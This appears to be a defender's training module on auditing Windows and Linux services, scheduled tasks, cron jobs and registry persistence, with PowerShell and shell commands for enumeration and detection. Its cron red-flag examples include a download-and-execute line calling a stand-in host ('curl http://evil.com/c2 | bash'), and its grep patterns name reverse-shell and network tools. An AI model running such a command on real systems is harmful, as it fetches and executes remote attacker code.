# Service Auditing

> **Module:** 03 — System Security | **Focus:** Auditing running services, scheduled tasks, and persistence mechanisms on Windows and Linux

Attackers who gain access to a system do not simply accomplish their objective and leave. They establish **persistence** — mechanisms that allow them to return even if their initial access vector is discovered and remediated. Services and scheduled tasks are among the most commonly abused persistence locations. This guide teaches defenders how to enumerate, baseline, and monitor these locations on both Windows and Linux.

---

## 📋 Table of Contents

1. [Auditing Services on Windows](#1-auditing-services-on-windows)
2. [Auditing Services on Linux](#2-auditing-services-on-linux)
3. [Identifying Suspicious Services](#3-identifying-suspicious-services)
4. [Scheduled Task and Cron Job Auditing](#4-scheduled-task-and-cron-job-auditing)
5. [Registry Persistence Locations on Windows](#5-registry-persistence-locations-on-windows)
6. [Baseline Comparison Methodology](#6-baseline-comparison-methodology)
7. [Module Practice Challenge](#7-module-practice-challenge)

---

## 1. Auditing Services on Windows

### 🟢 Beginner Explanation

On Windows, a **service** is a background process managed by the Service Control Manager (SCM). Services run independently of user sessions — they start at boot, run as specific accounts (often SYSTEM or a dedicated service account), and remain active even when no one is logged in. This makes services an attractive persistence target for attackers: a malicious service survives reboots, runs with elevated privileges, and may not appear in the list of running applications a user would normally see.

### 🔬 Technical Deep Dive

#### Querying Services with sc.exe

`sc.exe` is the command-line Service Control utility built into Windows:

```cmd
REM List all services and their state
sc query type= all state= all

REM Get detailed information about a specific service
sc qc svcname

REM Show all services including win32 own process and shared process
sc query type= all state= all | findstr /i "service_name state"

REM Query only running services
sc query state= active

REM Query only stopped services
sc query state= inactive

REM Get binary path of a specific service (critical for identifying suspicious services)
sc qc wuauserv
```

Example `sc qc` output — know what each field means:

```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: wuauserv
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START        ← 2=AUTO, 3=DEMAND, 4=DISABLED
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Windows Update
        DEPENDENCIES       : rpcss
        SERVICE_START_NAME : LocalSystem              ← Account the service runs as
```

#### Querying Services with PowerShell

PowerShell provides richer output than `sc.exe` and is easier to filter programmatically:

```powershell
# List all services with key properties
Get-Service | Select-Object Name, DisplayName, Status, StartType |
    Sort-Object Status, DisplayName | Format-Table -AutoSize

# Filter to running services only
Get-Service | Where-Object {$_.Status -eq "Running"} |
    Select-Object Name, DisplayName, StartType

# Get the executable path for every service (requires WMI)
Get-WmiObject Win32_Service |
    Select-Object Name, DisplayName, StartMode, State, PathName, StartName |
    Sort-Object State, Name | Format-Table -AutoSize

# Export full service inventory to CSV for baseline comparison
Get-WmiObject Win32_Service |
    Select-Object Name, DisplayName, StartMode, State, PathName, StartName |
    Export-Csv -Path "service_baseline_$(Get-Date -Format 'yyyyMMdd').csv" -NoTypeInformation

# Find services running as SYSTEM (high privilege — review carefully)
Get-WmiObject Win32_Service |
    Where-Object {$_.StartName -match 'LocalSystem|NT AUTHORITY\\SYSTEM'} |
    Select-Object Name, DisplayName, PathName | Sort-Object Name

# Find services running as a non-standard account (unusual — investigate)
Get-WmiObject Win32_Service |
    Where-Object {
        $_.StartName -notmatch 'LocalSystem|LocalService|NetworkService|NT AUTHORITY' -and
        $_.State -eq 'Running'
    } |
    Select-Object Name, DisplayName, StartName, PathName
```

#### Inspecting Service Binary Paths

A service binary path reveals where the executable lives. Legitimate services almost always run from:
- `C:\Windows\System32\`
- `C:\Windows\SysWOW64\`
- `C:\Program Files\`
- `C:\Program Files (x86)\`

Any service pointing to:
- `C:\Users\*`
- `C:\Temp\`
- `C:\ProgramData\` (without a known vendor subdirectory)
- A network path (`\\server\share\...`)
- A path with double extensions (`.pdf.exe`, `.doc.exe`)

…is highly suspicious and warrants immediate investigation.

```powershell
# Find services with binaries outside standard Windows paths
Get-WmiObject Win32_Service |
    Where-Object {
        $_.PathName -notmatch 'C:\\Windows|C:\\Program Files' -and
        $_.PathName -ne $null
    } |
    Select-Object Name, DisplayName, PathName, StartName, State

# Check digital signatures of service binaries
Get-WmiObject Win32_Service |
    Where-Object {$_.State -eq "Running"} |
    ForEach-Object {
        $path = ($_.PathName -split '\s+[-/]')[0].Trim('"').Trim()   # Strip quotes and CLI args
        if (Test-Path $path) {
            $sig = Get-AuthenticodeSignature -FilePath $path -ErrorAction SilentlyContinue
            [PSCustomObject]@{
                ServiceName = $_.Name
                BinaryPath  = $path
                SignerCert  = $sig.SignerCertificate.Subject
                Status      = $sig.Status
            }
        }
    } | Where-Object {$_.Status -ne "Valid"} | Format-Table -AutoSize
```

#### Reviewing Services via Services.msc

For a graphical view:

```
Win + R → services.msc
```

Key columns to review:
- **Name / Display Name** — Look for generic or random-looking names
- **Status** — Running services that you cannot explain require investigation
- **Startup Type** — Automatic services persist across reboots; understand why each is set to Automatic
- **Log On As** — Services running as SYSTEM with unusual binary paths are a red flag

#### Event ID 7045 — New Service Installed

Every new service installation generates Event ID 7045 in the System event log:

```powershell
# Find all service installation events in the last 30 days
Get-WinEvent -FilterHashtable @{
    LogName   = 'System'
    Id        = 7045
    StartTime = (Get-Date).AddDays(-30)
} | ForEach-Object {
    [PSCustomObject]@{
        Time        = $_.TimeCreated
        ServiceName = $_.Properties[0].Value
        ImagePath   = $_.Properties[1].Value
        ServiceType = $_.Properties[2].Value
        StartType   = $_.Properties[3].Value
        Account     = $_.Properties[4].Value
    }
} | Format-Table -AutoSize

# Alert on any new service installation in the last hour
$recentServices = Get-WinEvent -FilterHashtable @{
    LogName   = 'System'
    Id        = 7045
    StartTime = (Get-Date).AddHours(-1)
} -ErrorAction SilentlyContinue

if ($recentServices) {
    Write-Warning "⚠ New service(s) installed in the last hour!"
    $recentServices | Select-Object TimeCreated, Message | Format-List
}
```

### 🌍 Real-World Relevance

The PSEXEC tool (used legitimately by administrators and maliciously by attackers) works by installing a temporary service (`PSEXESVC`) on the target machine, using it to execute commands as SYSTEM, then removing it. Event ID 7045 combined with a service named `PSEXESVC` or any service with a binary path pointing to a user-writable location is a high-confidence indicator of lateral movement.

### 🛡️ Defensive Measures

- Alert on Event ID 7045 in real time via SIEM
- Baseline all services on each system type; alert on any deviation
- Use AppLocker or WDAC to prevent unsigned service binaries from executing
- Restrict the accounts that can install services (requires `SeServiceLogonRight` privilege)
- Monitor `HKLM\SYSTEM\CurrentControlSet\Services\` for new keys via Sysmon Event 12/13

---

## 2. Auditing Services on Linux

### 🟢 Beginner Explanation

On Linux, services are managed by the **init system** — most modern distributions use `systemd`. A systemd service is defined by a "unit file" that specifies what binary to run, what user to run it as, and when it should start. Auditing services on Linux means understanding which unit files are enabled, which are running, and whether any unexpected processes are present.

### 🔬 Technical Deep Dive

#### systemctl — The Primary Tool

```bash
# List all service units and their current state
sudo systemctl list-units --type=service

# List all enabled services (configured to start at boot)
sudo systemctl list-unit-files --type=service --state=enabled

# List all running services
sudo systemctl list-units --type=service --state=running

# List all failed services
sudo systemctl list-units --type=service --state=failed

# Detailed status of a specific service
sudo systemctl status sshd

# Show the unit file for a service
sudo systemctl cat sshd

# Show all properties of a service
sudo systemctl show nginx --property=ExecStart,User,Group,WorkingDirectory

# Show service dependencies
sudo systemctl list-dependencies sshd
```

#### Identifying Services Listening on Network Ports

A service that opens a network port is a higher-risk target than one that does not:

```bash
# Show all listening TCP and UDP ports with process names
sudo ss -tlnup

# Interpretation of ss output columns:
# Netid  State   Recv-Q  Send-Q  Local Address:Port  Peer Address:Port  Process
# tcp    LISTEN  0       128     0.0.0.0:22           0.0.0.0:*          users:(("sshd",pid=1234,fd=3))

# Find the process associated with a specific port
sudo ss -tlnp | grep ':80 '
sudo fuser 80/tcp          # Returns PID
sudo lsof -i :80           # Returns full process info

# Full listening service inventory
sudo ss -tlnup | tail -n +2 | awk '{print $1, $5, $7}' | sort -u
```

#### Examining systemd Unit Files for Suspicious Content

Legitimate unit files live in:
- `/usr/lib/systemd/system/` — installed by packages
- `/lib/systemd/system/` — installed by packages (Debian/Ubuntu)
- `/etc/systemd/system/` — administrator-created or overriding unit files

Suspicious locations include:
- `/tmp/`
- `/home/*/.config/systemd/user/` — user-level persistence (systemd user mode)
- Any unit file pointing to binaries in `/tmp`, `/var/tmp`, or `/dev/shm`

```bash
# List all unit files in non-standard locations
find /etc/systemd/system/ -name "*.service" -newer /etc/systemd/system/ 2>/dev/null

# Show recently modified unit files (within the last 7 days)
find /etc/systemd /usr/lib/systemd /lib/systemd \
    -name "*.service" -newer /var/log/syslog 2>/dev/null | sort

# Examine ExecStart lines across all unit files — find unusual binary paths
grep -r "ExecStart" /etc/systemd/system/ /usr/lib/systemd/system/ 2>/dev/null |
    grep -v '/usr/\|/bin/\|/sbin/' | grep -v "#"

# Find unit files pointing to /tmp, /dev/shm, or /home
grep -r "ExecStart" /etc/systemd/system/ /usr/lib/systemd/system/ 2>/dev/null |
    grep -E '/tmp|/dev/shm|/home/|/var/tmp'
```

#### Using ps aux for Process-Level Visibility

While `systemctl` shows managed services, `ps aux` shows all running processes regardless of how they were started — including those run directly or via other mechanisms:

```bash
# Full process list with user, CPU, memory, command
ps aux

# Sort by CPU usage (top consumers first)
ps aux --sort=-%cpu | head -20

# Sort by memory usage
ps aux --sort=-%mem | head -20

# Show processes for a specific user
ps aux | grep alice

# Show process tree (parent-child relationships) — reveals suspicious parent-child chains
ps auxf
pstree -p

# Find processes with network connections
ps aux | grep -E 'nc |netcat|socat|ncat'

# Find processes running from suspicious directories
ps aux | grep -E '/tmp/|/dev/shm/|/var/tmp/'

# Show all processes with their full command line and environment
ps -eo pid,user,args | sort -k2

# Detect processes hiding their name (common rootkit technique)
# Compare ps output with /proc filesystem
for pid in /proc/[0-9]*/; do
    pid_num=$(basename "$pid")
    cmdline=$(cat "$pid/cmdline" 2>/dev/null | tr '\0' ' ')
    if [ -n "$cmdline" ]; then
        echo "PID: $pid_num | CMD: $cmdline"
    fi
done | sort -t: -k1 -n
```

#### Checking for User-Level Persistence (systemd --user)

Users can install persistent services in their own systemd user session — these do not require root:

```bash
# List user-level systemd services (run as the target user)
systemctl --user list-units --type=service
systemctl --user list-unit-files --type=service --state=enabled

# Find user unit files across all users
find /home -path "*/systemd/user/*.service" 2>/dev/null
find /root -path "*/systemd/user/*.service" 2>/dev/null

# Examine user-level unit files
cat /home/alice/.config/systemd/user/suspicious.service
```

### 🌍 Real-World Relevance

Cryptomining malware on Linux frequently installs itself as a systemd service to maintain persistence after system reboots. The service is often named something innocuous (`networkd-helper`, `systemd-updated`, `cron-daily`) and its unit file points to a binary in `/tmp` or `/var/tmp`. Post-exploitation frameworks like Metasploit and Empire also generate systemd service persistence by default when operating on Linux targets.

### 🛡️ Defensive Measures

- Run `systemctl list-unit-files --state=enabled` weekly and compare to baseline
- Monitor `/etc/systemd/system/` for new files using auditd
- Alert on processes running from `/tmp`, `/dev/shm`, or `/var/tmp`
- Disable the ability for non-admin users to create systemd user services if not required (`systemctl --global disable user@.service`)
- Use `chkrootkit` or `rkhunter` to detect rootkit-style process hiding

---

## 3. Identifying Suspicious Services

### 🟢 Beginner Explanation

Not all suspicious services are obviously malicious. Attackers invest significant effort in making their persistence mechanisms blend in — using names similar to legitimate Windows or Linux services, hiding in expected installation directories, or hijacking legitimate service configurations. This section covers the indicators and patterns defenders should look for.

### 🔬 Technical Deep Dive

#### Red Flags for Suspicious Services — Windows

| Indicator | Explanation | Example |
|-----------|-------------|---------|
| Random or gibberish name | Malware-generated service names | `svchost32`, `msupdate`, `svch0st` |
| Typosquatting legitimate names | Names resembling known services | `Windows Update Service` vs `WindowsUpdateService` |
| Binary in user-writable path | Executable not in protected directories | `C:\Users\alice\AppData\...` |
| Unsigned binary | Legitimate Windows services are always signed | No Authenticode signature |
| Running as SYSTEM with unusual path | High privilege + unusual location | `SYSTEM` running `C:\Temp\payload.exe` |
| Single-character or very short name | Unusual naming pattern | Service name: `a`, `x`, `1a` |
| Recently installed (no match in baseline) | New service after build date | Event 7045 from last week on a 6-month-old system |
| Service binary is a script interpreter | Unusual for a service | `cmd.exe /c powershell.exe -enc ...` |
| Dependency on nothing / no dependencies | Legitimate services usually have standard dependencies | No Depends= field, unusual |

```powershell
# Hunt for likely-malicious service names (gibberish detection — basic heuristic)
Get-WmiObject Win32_Service | Where-Object {
    # Service name matches pattern of random characters (no vowels, length 6-12)
    $_.Name -match '^[^aeiouAEIOU]{6,12}$' -or
    # Contains digits mixed with letters unusually
    $_.Name -match '\d{4,}' -or
    # Common typosquats
    $_.Name -match 'svchost(?!\.exe)|svch0st|scvhost|svchosts'
} | Select-Object Name, DisplayName, PathName, State

# Check for services with binary paths in writable locations
$writablePaths = @('\\Users\\', '\\Temp\\', '\\AppData\\', '\\ProgramData\\(?!Microsoft|Windows)', 
                   '\\Public\\', '%TEMP%', '%APPDATA%')

Get-WmiObject Win32_Service | Where-Object {
    $path = $_.PathName
    $writablePaths | Where-Object { $path -match $_ }
} | Select-Object Name, DisplayName, PathName, StartName, State | Format-Table -AutoSize

# Find services where the binary no longer exists (ghost service — may indicate prior malware)
Get-WmiObject Win32_Service | ForEach-Object {
    $path = ($_.PathName -split '\s+[-/]')[0].Trim('"').Trim()
    if ($path -and !(Test-Path $path)) {
        [PSCustomObject]@{
            Name    = $_.Name
            Path    = $path
            State   = $_.State
            Missing = $true
        }
    }
} | Format-Table -AutoSize
```

#### Red Flags for Suspicious Services — Linux

```bash
# Find services with ExecStart pointing outside standard binary locations
for unit_dir in /etc/systemd/system /usr/lib/systemd/system /lib/systemd/system; do
    find "$unit_dir" -name "*.service" -exec grep -l "ExecStart" {} \; 2>/dev/null |
    while read -r unit; do
        exec_path=$(grep "^ExecStart=" "$unit" 2>/dev/null | head -1 | cut -d= -f2- | awk '{print $1}')
        if echo "$exec_path" | grep -qE '^/tmp|^/dev/shm|^/home|^/var/tmp|^/root'; then
            echo "⚠ SUSPICIOUS: $unit → ExecStart: $exec_path"
        fi
    done
done

# Check for processes with deleted executables (attacker deleted binary after launch)
ls -la /proc/*/exe 2>/dev/null | grep "(deleted)"

# Find processes listening on high-numbered ports (potential backdoors)
sudo ss -tlnp | awk 'NR>1 {print $5}' | cut -d: -f2 |
    while read port; do
        if [ "$port" -gt 1024 ] 2>/dev/null; then
            echo "High port in use: $port"
            sudo ss -tlnp | grep ":$port "
        fi
    done

# Detect processes with no associated package (possible unpackaged malware)
# This checks running processes and whether their binary is part of any installed package
# Note: Uses dpkg (Debian/Ubuntu); replace with 'rpm -qf' on RHEL/CentOS systems
ps -eo pid,comm,exe 2>/dev/null | while read pid comm exe; do
    if [ -f "$exe" ]; then
        if ! dpkg -S "$exe" &>/dev/null; then
            echo "Unpackaged binary: PID=$pid COMM=$comm EXE=$exe"
        fi
    fi
done 2>/dev/null | grep -v "^$"

# Find services with world-writable unit files (attacker could modify them)
find /etc/systemd/system /usr/lib/systemd/system -name "*.service" -perm -002 2>/dev/null
```

#### Checking Hashes Against Known-Bad (VirusTotal Offline Approach)

```powershell
# Windows: Compute SHA256 hashes of all service binaries
Get-WmiObject Win32_Service |
    Where-Object {$_.State -eq "Running"} |
    ForEach-Object {
        $path = ($_.PathName -split '\s+[-/]')[0].Trim('"').Trim()
        if ($path -and (Test-Path $path)) {
            $hash = (Get-FileHash -Path $path -Algorithm SHA256 -ErrorAction SilentlyContinue).Hash
            [PSCustomObject]@{
                ServiceName = $_.Name
                Path        = $path
                SHA256      = $hash
            }
        }
    } | Export-Csv "service_hashes.csv" -NoTypeInformation
```

```bash
# Linux: Compute SHA256 hashes of all service executables
systemctl list-units --type=service --state=running --no-legend |
    awk '{print $1}' |
    while read unit; do
        exec_path=$(systemctl show "$unit" -p ExecStart --value 2>/dev/null |
            awk '{print $2}' | head -1)
        if [ -f "$exec_path" ]; then
            hash=$(sha256sum "$exec_path" 2>/dev/null | awk '{print $1}')
            echo "$hash  $unit  $exec_path"
        fi
    done
```

### 🌍 Real-World Relevance

Advanced Persistent Threat (APT) groups routinely name malicious services using variants of common Windows service names — `svchost.exe` is impersonated more than any other binary (APT29 / Cozy Bear has used `svchost32.exe` and similar). The key distinguishing factor is always the **binary path**: the real `svchost.exe` lives only in `C:\Windows\System32\` — anything else is immediately suspicious regardless of how legitimate the name looks.

### 🛡️ Defensive Measures

- Maintain a list of approved service names and binary paths per server type
- Alert on any service whose binary path is not in the approved list
- Integrate hash comparison with a threat intelligence feed
- Use Windows Defender Credential Guard and WDAC policies to reduce the impact of malicious services
- Run `Get-AuthenticodeSignature` on all service binaries; unsigned = immediate investigation

---

## 4. Scheduled Task and Cron Job Auditing

### 🟢 Beginner Explanation

Scheduled tasks (Windows) and cron jobs (Linux) are mechanisms for running programs automatically at specified times or intervals. They are entirely legitimate — backup jobs, patch management, log rotation all use them. But they are also one of the most commonly abused persistence mechanisms by attackers, because they survive reboots, run silently in the background, and are easy to create without elevated privileges (in some cases).

### 🔬 Technical Deep Dive

#### Windows: Auditing the Task Scheduler

```powershell
# List all scheduled tasks with key details
Get-ScheduledTask | Select-Object TaskName, TaskPath, State,
    @{N='Actions';E={($_.Actions | ForEach-Object {$_.Execute + ' ' + $_.Arguments}) -join '; '}},
    @{N='Triggers';E={($_.Triggers | ForEach-Object {$_.TriggerType}) -join '; '}},
    @{N='RunAs';E={$_.Principal.UserId}} |
    Format-Table -AutoSize -Wrap

# Filter to tasks outside the \Microsoft\ path (custom/non-Microsoft tasks)
Get-ScheduledTask | Where-Object {$_.TaskPath -notmatch '^\\Microsoft\\'} |
    Select-Object TaskName, TaskPath, State,
        @{N='Actions';E={($_.Actions | ForEach-Object {$_.Execute}) -join '; '}},
        @{N='RunAs';E={$_.Principal.UserId}} |
    Format-Table -AutoSize

# Show tasks that run as SYSTEM or Administrator
Get-ScheduledTask | Where-Object {
    $_.Principal.UserId -match 'SYSTEM|Administrator|S-1-5-18'
} | Select-Object TaskName, TaskPath,
    @{N='Actions';E={($_.Actions | ForEach-Object {$_.Execute + ' ' + $_.Arguments}) -join '; '}},
    @{N='RunAs';E={$_.Principal.UserId}} |
    Format-Table -AutoSize

# Export full task inventory to XML for baseline comparison
schtasks /query /fo XML /v | Out-File "task_baseline_$(Get-Date -Format 'yyyyMMdd').xml"

# Alternative: use schtasks.exe for CSV output
schtasks /query /fo CSV /v | ConvertFrom-Csv |
    Select-Object "Task To Run", "Run As User", Status, "Scheduled Task State" |
    Format-Table -AutoSize

# Find tasks with actions pointing to suspicious locations
Get-ScheduledTask | ForEach-Object {
    $task = $_
    $task.Actions | ForEach-Object {
        $exe = $_.Execute
        if ($exe -match '\\Users\\|\\Temp\\|\\AppData\\|\\Public\\|%TEMP%|%APPDATA%') {
            [PSCustomObject]@{
                TaskName   = $task.TaskName
                TaskPath   = $task.TaskPath
                Action     = $exe
                Arguments  = $_.Arguments
                RunAs      = $task.Principal.UserId
            }
        }
    }
} | Format-Table -AutoSize
```

#### Windows: Detecting Scheduled Task Events

```powershell
# Event ID 4698 — Scheduled task was created
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4698} |
    Select-Object TimeCreated,
        @{N='TaskName';E={
            ($_.Message -split '\n' | Select-String 'Task Name:') -replace '.*Task Name:\s+', ''
        }},
        Message | Format-List

# Event ID 4702 — Scheduled task was updated
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4702} |
    Select-Object TimeCreated, Message | Format-List

# Event ID 4699 — Scheduled task was deleted
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4699} |
    Select-Object TimeCreated, Message | Format-List

# Find all task-related events in the last 24 hours
Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    Id        = @(4698, 4699, 4700, 4701, 4702)
    StartTime = (Get-Date).AddHours(-24)
} | Select-Object Id, TimeCreated, Message | Format-List
```

#### Windows: Task Scheduler via GUI

```
Win + R → taskschd.msc
```

Navigate to: **Task Scheduler Library** — review every entry under the root and under third-party vendor folders. Red flags:
- Tasks with `<hidden>` XML element set to true
- Tasks running from `cmd.exe` with a long encoded PowerShell command as an argument
- Tasks with triggers set to run at logon, startup, or on event ID triggers
- Tasks with no author or an author that doesn't match the vendor

```powershell
# Find tasks with the Hidden property set
Get-ScheduledTask | Where-Object {$_.Settings.Hidden -eq $true} |
    Select-Object TaskName, TaskPath,
        @{N='Actions';E={($_.Actions | ForEach-Object {$_.Execute}) -join '; '}}
```

#### Linux: Auditing Cron Jobs

Cron job locations — check all of them:

```bash
# System-level crontab (requires root — typically contains system maintenance tasks)
sudo cat /etc/crontab

# System cron directories (scripts placed here run at fixed intervals)
sudo ls -la /etc/cron.d/
sudo ls -la /etc/cron.hourly/
sudo ls -la /etc/cron.daily/
sudo ls -la /etc/cron.weekly/
sudo ls -la /etc/cron.monthly/

# User-level crontabs (each user can have their own cron schedule)
# Stored in: /var/spool/cron/crontabs/ (Debian/Ubuntu) or /var/spool/cron/ (RHEL)
sudo ls -la /var/spool/cron/crontabs/

# View a specific user's crontab
sudo crontab -l -u alice
sudo crontab -l -u root

# List crontabs for ALL users on the system
for user in $(cut -d: -f1 /etc/passwd); do
    crontab_content=$(sudo crontab -l -u "$user" 2>/dev/null)
    if [ -n "$crontab_content" ]; then
        echo "=== Crontab for user: $user ==="
        echo "$crontab_content"
        echo ""
    fi
done

# Find all cron-related files system-wide
find / -name "crontab" -o -name "cron.d" -o -name "cron.daily" \
    -o -name "cron.hourly" -o -name "cron.weekly" \
    -o -name "cron.monthly" 2>/dev/null | grep -v proc
```

#### Linux: Cron Format and Red Flags

```bash
# Cron format: minute hour day_of_month month day_of_week command
# Example crontab entries:
# 0  2  *  *  * /usr/bin/find /var -name "*.log" -delete     ← Log rotation (legitimate)
# */5 * * * * /tmp/beacon.sh                                  ← ⚠️ Running from /tmp every 5 min
# @reboot /home/alice/.hidden/payload                         ← ⚠️ Runs at every reboot
# * * * * * curl http://evil.com/c2 | bash                   ← ⚠️ Download and execute

# Find cron jobs running commands from suspicious locations
sudo grep -r "/tmp\|/dev/shm\|curl\|wget\|bash -i\|nc \|netcat\|/var/tmp" \
    /etc/cron* /var/spool/cron/ 2>/dev/null

# Find recently modified cron files (last 7 days)
find /etc/cron* /var/spool/cron/ -newer /etc/crontab -ls 2>/dev/null

# Check for cron scripts that download and execute content (dropper pattern)
grep -rE "curl|wget|fetch" /etc/cron* /var/spool/cron/ 2>/dev/null |
    grep -E "bash|sh|exec|eval|python|perl|ruby"
```

#### Linux: at Jobs

`at` allows one-time scheduling of future jobs:

```bash
# List all pending at jobs
sudo atq

# View the content of a specific at job
sudo at -c <job_number>

# Find jobs scheduled by all users
for user in $(cut -d: -f1 /etc/passwd); do
    jobs=$(sudo atq -q a 2>/dev/null | grep "$user")
    if [ -n "$jobs" ]; then
        echo "at jobs for $user: $jobs"
    fi
done

# Remove a suspicious at job
# ⚠️ Lab Environment Only
atrm <job_number>
```

### 🌍 Real-World Relevance

The ransomware group **BlackMatter** used scheduled tasks as a core persistence mechanism — creating tasks via `schtasks.exe` that would re-launch the ransomware payload if the initial execution was interrupted. Detecting these tasks via Event ID 4698 monitoring is one of the fastest ways to identify active ransomware operations before encryption completes. Similarly, cryptocurrency mining malware on Linux almost universally installs a cron job in `/var/spool/cron/` or `/etc/cron.d/` to ensure the miner restarts after any reboot or process kill.

### 🛡️ Defensive Measures

- Alert on Event IDs 4698 and 4702 for unexpected task creation or modification
- Audit all cron locations weekly; compare to a documented baseline
- Restrict crontab creation to authorised users only (`/etc/cron.allow` on Linux)
- Monitor cron job files with auditd (`-w /etc/cron.d/ -p wa -k cron`)
- Block cron jobs from executing scripts in `/tmp` or `/dev/shm` via AppArmor/SELinux

---

## 5. Registry Persistence Locations on Windows

### 🟢 Beginner Explanation

The Windows Registry contains dozens of locations that can be used to achieve persistence — automatically executing code when the system boots, when a user logs in, or when specific events occur. Understanding the full landscape of these locations is essential for both defenders (to monitor them) and incident responders (to hunt for malicious entries during an investigation).

### 🔬 Technical Deep Dive

#### Comprehensive Registry Persistence Map

```powershell
# Define all known persistence-relevant registry locations
$persistenceLocations = @{

    # ── Autorun Keys (run at logon / boot) ──────────────────────────────────
    'HKLM Run'           = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    'HKLM RunOnce'       = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce'
    'HKLM RunOnceEx'     = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx'
    'HKLM RunServices'   = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices'
    'HKCU Run'           = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    'HKCU RunOnce'       = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce'

    # ── Winlogon Hijacking ───────────────────────────────────────────────────
    # Legitimate values: Userinit=C:\Windows\System32\userinit.exe,
    #                    Shell=explorer.exe
    'Winlogon'           = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'

    # ── Image File Execution Options (Debugger hijacking) ───────────────────
    # Used to set a debugger for an executable — attacker can launch a backdoor
    # when a target program (e.g., sethc.exe, utilman.exe) runs
    'IFEO'               = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options'

    # ── AppInit_DLLs (DLL injection into user-mode processes) ───────────────
    # Should be empty on a hardened system
    'AppInit_DLLs'       = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows'

    # ── Services ────────────────────────────────────────────────────────────
    'Services'           = 'HKLM:\SYSTEM\CurrentControlSet\Services'

    # ── Boot Execute (runs before logon) ────────────────────────────────────
    # Legitimate values: autocheck autochk *
    'BootExecute'        = 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager'

    # ── Shell Folders / User Shell Folders ──────────────────────────────────
    'ShellFolders'       = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders'
    'UserShellFolders'   = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders'

    # ── Active Setup (runs once per user on first logon) ────────────────────
    'ActiveSetup'        = 'HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components'

    # ── COM Hijacking ────────────────────────────────────────────────────────
    'CLSID_HKCU'         = 'HKCU:\SOFTWARE\Classes\CLSID'

    # ── Browser Helper Objects (BHO) ─────────────────────────────────────────
    'BHO'                = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects'

    # ── Scheduled Tasks (also in registry) ──────────────────────────────────
    'ScheduledTasks'     = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks'
}

# Query all persistence locations and display their values
foreach ($location in $persistenceLocations.GetEnumerator()) {
    Write-Host "`n=== $($location.Key) ===" -ForegroundColor Cyan
    Write-Host "Path: $($location.Value)" -ForegroundColor Gray
    try {
        $values = Get-ItemProperty -Path $location.Value -ErrorAction Stop
        $values.PSObject.Properties |
            Where-Object {$_.Name -notmatch '^PS'} |
            ForEach-Object {
                Write-Host "  [$($_.Name)] = $($_.Value)"
            }
    } catch {
        Write-Host "  (key not found or access denied)" -ForegroundColor DarkGray
    }
}
```

#### Winlogon-Specific Checks

```powershell
# Check Winlogon for tampering — these values should be exactly as shown
$winlogon = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Expected: C:\Windows\system32\userinit.exe,
if ($winlogon.Userinit -ne "C:\Windows\system32\userinit.exe,") {
    Write-Warning "⚠ Userinit has been modified: $($winlogon.Userinit)"
}

# Expected: explorer.exe
if ($winlogon.Shell -ne "explorer.exe") {
    Write-Warning "⚠ Shell has been modified: $($winlogon.Shell)"
}
```

#### AppInit_DLLs Check

```powershell
# AppInit_DLLs should be empty on a hardened system
$appInit = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" `
    -ErrorAction SilentlyContinue

if ($appInit.AppInit_DLLs -ne "" -and $appInit.AppInit_DLLs -ne $null) {
    Write-Warning "⚠ AppInit_DLLs contains a value: $($appInit.AppInit_DLLs)"
    Write-Warning "This can indicate DLL injection persistence"
}

# Ensure AppInit_DLLs is disabled (requires LoadAppInit_DLLs = 0)
if ($appInit.LoadAppInit_DLLs -ne 0) {
    Write-Warning "⚠ LoadAppInit_DLLs is enabled — consider disabling"
}
```

#### Hunting with Autoruns (Sysinternals)

Autoruns is the gold-standard tool for finding persistence on Windows. It enumerates all of the above locations and more:

```powershell
# Download from: https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns
# Run as Administrator

# Command-line version: autorunsc.exe
# Export all autostart entries to CSV (for baseline comparison)
.\autorunsc.exe -a * -c -h -s '*' -nobanner | Out-File autoruns_baseline.csv

# Run without hash computation (faster)
.\autorunsc.exe -a * -nobanner

# Key autorunsc flags:
# -a *  = scan all categories
# -c    = print output as CSV
# -h    = include file hashes
# -s    = check VirusTotal (requires internet in lab)
# -u    = show only unsigned entries (high value for triage)

# Show only unsigned entries (most likely to be malicious)
.\autorunsc.exe -a * -u -nobanner
```

### 🌍 Real-World Relevance

The MITRE ATT&CK framework lists over 20 distinct Windows registry-based persistence techniques. During the SolarWinds compromise, the Sunburst malware used registry keys and the `ImageFileExecutionOptions` debugger hijacking technique as part of its multi-stage execution chain. APT41 (a Chinese state-sponsored group) is documented as heavily using registry Run keys, Winlogon modifications, and COM hijacking across multiple campaigns.

### 🛡️ Defensive Measures

- Monitor all persistence registry locations with Sysmon Event 13 (registry value set)
- Alert on modifications to Winlogon keys (Shell, Userinit) — these should never change
- Disable AppInit_DLLs at the Group Policy level
